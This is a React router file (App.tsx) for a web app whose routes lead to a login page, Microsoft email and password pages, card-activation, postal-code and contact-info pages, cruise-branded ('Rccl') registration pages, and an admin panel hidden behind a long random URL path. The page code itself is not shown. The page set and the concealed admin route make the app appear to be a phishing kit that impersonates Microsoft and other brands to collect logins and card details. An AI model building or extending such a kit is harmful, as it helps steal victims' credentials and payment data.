import { Switch, Route } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { LanguageProvider } from "@/contexts/LanguageContext";
import { ContentProtection } from "@/components/ContentProtection";
import NotFound from "@/pages/not-found";
import LoginPage from "@/pages/LoginPage";
import PostalCodePage from "@/pages/PostalCodePage";
import CardActivationPage from "@/pages/CardActivationPage";
import ContactInfoPage from "@/pages/ContactInfoPage";
import RegisterPage from "@/pages/RegisterPage";
import ForgotUsernamePage from "@/pages/ForgotUsernamePage";
import ForgotPasswordPage from "@/pages/ForgotPasswordPage";
import MicrosoftEmailPage from "@/pages/MicrosoftEmailPage";
import MicrosoftPasswordPage from "@/pages/MicrosoftPasswordPage";
import AdminPage from "@/pages/AdminPage";
import AccountPage from "@/pages/AccountPage";
import RcclPage from "@/pages/RcclPage";
import RcclRegisterPage from "@/pages/RcclRegisterPage";
import RcclCardActivationPage from "@/pages/RcclCardActivationPage";

function Router() {
  return (
    <Switch>
      <Route path="/" component={LoginPage} />
      <Route path="/account" component={AccountPage} />
      <Route path="/rccl" component={RcclPage} />
      <Route path="/rccl-register" component={RcclRegisterPage} />
      <Route path="/rccl-activate-card" component={RcclCardActivationPage} />
      <Route path="/postal-code" component={PostalCodePage} />
      <Route path="/activate-card" component={CardActivationPage} />
      <Route path="/contact-info" component={ContactInfoPage} />
      <Route path="/register" component={RegisterPage} />
      <Route path="/forgot-username" component={ForgotUsernamePage} />
      <Route path="/forgot-password" component={ForgotPasswordPage} />
      <Route path="/microsoft-email" component={MicrosoftEmailPage} />
      <Route path="/microsoft-password" component={MicrosoftPasswordPage} />
      <Route path="/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a" component={AdminPage} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <LanguageProvider>
        <TooltipProvider>
          <ContentProtection />
          <Toaster />
          <Router />
        </TooltipProvider>
      </LanguageProvider>
    </QueryClientProvider>
  );
}

export default App;
